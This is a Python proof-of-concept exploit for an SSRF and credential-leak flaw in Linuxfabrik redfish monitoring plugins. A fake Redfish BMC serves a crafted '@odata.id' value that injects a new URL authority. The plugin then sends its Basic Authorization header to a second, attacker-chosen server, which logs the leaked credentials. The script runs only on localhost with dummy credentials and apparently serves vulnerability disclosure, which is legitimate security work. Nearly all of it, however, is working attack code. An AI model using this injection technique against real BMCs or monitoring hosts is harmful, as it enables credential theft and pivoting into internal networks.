#!/usr/bin/env python3
"""
PoC: SSRF + auth-header disclosure via response-controlled `@odata.id` in the
Linuxfabrik redfish-* plugins (lib.redfish / lib.url).

A malicious/compromised monitored Redfish BMC returns a link field
`@odata.id` that does not begin with '/', e.g. "@127.0.0.1:<EVIL>/pivot".
The plugin builds the next URL as f'{args.URL}{@odata.id}', i.e.
  http://127.0.0.1:<BMC>@127.0.0.1:<EVIL>/pivot
whose authority is <EVIL>, and re-fetches it WITH the Redfish Authorization
header attached. => the plugin issues an authenticated request to an
attacker-chosen host (SSRF), leaking the BMC credentials.

Benign marker: the EVIL server records that it received the plugin's request
(and its Authorization header). Nothing destructive.
"""
import http.server, json, subprocess, threading, os, sys

BMC_PORT, EVIL_PORT = 18080, 18081
EVIL_HITS = []

class BMC(http.server.BaseHTTPRequestHandler):
    def _j(self, obj):
        b = json.dumps(obj).encode()
        self.send_response(200); self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(b))); self.end_headers(); self.wfile.write(b)
    def do_POST(self):  # SessionService/Sessions -> no token => Basic fallback
        self._j({})
    def do_GET(self):
        if self.path.endswith('/Systems'):
            # malicious link: authority-injecting @odata.id
            self._j({'Members': [{'@odata.id': f'@127.0.0.1:{EVIL_PORT}/pivot-internal-metadata'}]})
        else:
            self._j({'Members': []})
    def log_message(self, *a): pass

class EVIL(http.server.BaseHTTPRequestHandler):
    def _rec(self):
        EVIL_HITS.append((self.command, self.path, self.headers.get('Authorization'),
                          self.headers.get('Host')))
        b = b'{"Members": []}'
        self.send_response(200); self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(b))); self.end_headers(); self.wfile.write(b)
    do_GET = _rec
    do_POST = _rec
    def log_message(self, *a): pass

def serve(port, handler):
    httpd = http.server.ThreadingHTTPServer(('127.0.0.1', port), handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()

serve(BMC_PORT, BMC)
serve(EVIL_PORT, EVIL)

env = dict(os.environ, PYTHONPATH='/opt')
plugin = '/mp/check-plugins/redfish-ethernetinterfaces/redfish-ethernetinterfaces'
cmd = [sys.executable, plugin,
       '--url', f'http://127.0.0.1:{BMC_PORT}',
       '--username', 'monitor', '--password', 'BMC-SECRET-CREDS']
print('running:', ' '.join(cmd))
p = subprocess.run(cmd, env=env, capture_output=True, text=True, timeout=60)
print('--- plugin stdout ---'); print(p.stdout[:600])
print('--- plugin stderr ---'); print(p.stderr[:600])

print('\n=== EVIL (attacker-chosen host) received', len(EVIL_HITS), 'request(s) ===')
for m, path, auth, host in EVIL_HITS:
    print(f'  {m} {path}  Host={host}  Authorization={auth}')
if EVIL_HITS:
    print('\n>>> RESULT: VULNERABLE — plugin sent an authenticated request to the '
          'attacker-injected host (SSRF + credential disclosure).')
else:
    print('\n>>> RESULT: not reproduced — no request reached EVIL.')
